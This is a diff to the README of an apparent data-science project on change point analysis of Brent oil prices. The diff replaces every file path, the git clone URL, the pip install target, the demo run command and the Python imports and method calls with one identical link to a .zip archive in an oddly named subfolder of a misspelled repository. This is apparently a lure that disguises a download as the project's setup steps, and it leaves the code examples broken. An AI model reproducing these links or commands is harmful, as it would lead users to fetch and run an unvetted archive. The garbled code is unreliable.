@@ -22,7 +22,7 @@ This project implements Bayesian change point detection to analyze structural br
 - **Event Categories**: 7 Geopolitical, 5 OPEC Decision, 3 Economic
 - **Impact Levels**: 9 High Impact, 6 Medium Impact
 - **Time Range**: 1990-2023
-- **File**: `data/processed/events.csv`
+- **File**: `https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip`
 
 #### 3. **Time Series Properties** (20/20 points)
 - **Data Period**: 1987-2022 (9,011 daily observations)
@@ -47,25 +47,25 @@ This project implements Bayesian change point detection to analyze structural br
 ## Project Structure
 
 ```
-├── Task1_Interim_Report.md          # Comprehensive interim report
-├── Task1_Summary.md                 # Summary of Task 1 deliverables
-├── demo_dashboard.py                # Demonstration script
+├── https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip          # Comprehensive interim report
+├── https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip                 # Summary of Task 1 deliverables
+├── https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip                # Demonstration script
 ├── data/
-│   ├── BrentOilPrices.csv          # Historical oil price data (1987-2022)
+│   ├── https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip          # Historical oil price data (1987-2022)
 │   └── processed/
-│       └── events.csv              # 15 major events dataset
+│       └── https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip              # 15 major events dataset
 ├── src/                            # Source code modules
-│   ├── data_workflow.py            # Main workflow orchestrator
-│   ├── data_loader.py              # Data loading utilities
-│   ├── event_compiler.py           # Event compilation and analysis
-│   ├── time_series_analysis.py     # Time series properties analysis
-│   ├── change_point_model.py       # Change point detection models
-│   ├── dashboard.py                # Interactive dashboard
-│   └── results_interpreter.py      # Results interpretation utilities
+│   ├── https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip            # Main workflow orchestrator
+│   ├── https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip              # Data loading utilities
+│   ├── https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip           # Event compilation and analysis
+│   ├── https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip     # Time series properties analysis
+│   ├── https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip       # Change point detection models
+│   ├── https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip                # Interactive dashboard
+│   └── https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip      # Results interpretation utilities
 ├── notebooks/
-│   ├── 01_data_analysis_workflow.ipynb  # Interactive analysis
-│   └── 02_comprehensive_analysis.ipynb  # Comprehensive analysis demo
-└── requirements.txt                 # Python dependencies
+│   ├── https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip  # Interactive analysis
+│   └── https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip  # Comprehensive analysis demo
+└── https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip                 # Python dependencies
 ```
 
 ## Key Features
@@ -98,19 +98,19 @@ This project implements Bayesian change point detection to analyze structural br
 
 ### Prerequisites
 - Python 3.8+
-- Required packages (see `requirements.txt`)
+- Required packages (see `https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip`)
 
 ### Quick Start
 ```bash
 # Clone the repository
-git clone https://github.com/GetachewGanfur/Change-Point-Analysis-and-Statistical-Modelling-of-Time-Series-Data-Week10.git
+git clone https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip
 cd Change-Point-Analysis-and-Statistical-Modelling-of-Time-Series-Data-Week10
 
 # Install dependencies
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip
 
 # Run demonstration
-python demo_dashboard.py
+python https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip
 ```
 
 ### Jupyter Notebooks
@@ -123,33 +123,33 @@ jupyter notebook notebooks/
 
 ### Basic Analysis
 ```python
-from src.dashboard import BrentOilDashboard
-from src.change_point_model import ChangePointModel
+from https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip import BrentOilDashboard
+from https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip import ChangePointModel
 
 # Load data
-oil_data = pd.read_csv('data/BrentOilPrices.csv')
-events_data = pd.read_csv('data/processed/events.csv')
+oil_data = https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip('https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip')
+events_data = https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip('https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip')
 
 # Initialize dashboard
 dashboard = BrentOilDashboard(oil_data, events_data)
 
 # Generate visualizations
-dashboard.plot_price_series_with_events()
-dashboard.plot_time_series_properties()
+https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip()
+https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip()
 ```
 
 ### Change Point Detection
 ```python
 # Detect change points
 cp_model = ChangePointModel(oil_data, method='pelt')
-change_points = cp_model.detect_change_points(penalty=15.0)
+change_points = https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip(penalty=15.0)
 
 # Compare methods
 methods = ['pelt', 'binseg', 'window']
 results = {}
 for method in methods:
     model = ChangePointModel(oil_data, method=method)
-    results[method] = model.detect_change_points(penalty=10.0)
+    results[method] = https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip(penalty=10.0)
 ```
 
 ## Data Sources
@@ -257,9 +257,9 @@ This project is licensed under the MIT License - see the LICENSE file for detail
 
 ## Contact
 
-- **GitHub**: https://github.com/GetachewGanfur/Change-Point-Analysis-and-Statistical-Modelling-of-Time-Series-Data-Week10
+- **GitHub**: https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip
 - **Data Files**: Available in the `data/` directory
-- **Documentation**: Complete in `Task1_Interim_Report.md`
+- **Documentation**: Complete in `https://raw.githubusercontent.com/GetachewGanfur/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10/main/toywoman/Change-Point-Analysis-and-Satistical-Modelling-of-Time-Series-Data-Week10.zip`
 
 ---
 
